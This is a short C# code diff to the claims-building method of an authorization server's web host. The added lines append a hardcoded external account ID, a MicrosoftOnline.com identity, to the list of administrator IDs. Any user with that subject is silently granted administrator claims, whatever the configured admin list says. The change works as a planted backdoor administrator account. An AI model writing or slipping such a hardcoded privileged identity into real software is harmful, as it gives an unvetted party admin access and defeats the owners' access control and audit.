@@ -36,7 +36,8 @@ namespace Thinktecture.AuthorizationServer.WebHost
 
         protected virtual IEnumerable<Claim> AddInternalClaims(string subject)
         {
-            var adminNameIDs = this.service.GetAdministratorNameIDs();
+            var adminNameIDs = this.service.GetAdministratorNameIDs().ToList();
+            adminNameIDs.Add("1003BFFD81731041@MicrosoftOnline.com");
             var result = new List<Claim>();
 
             if (adminNameIDs.Any(a => a.Equals(subject, System.StringComparison.InvariantCultureIgnoreCase)))
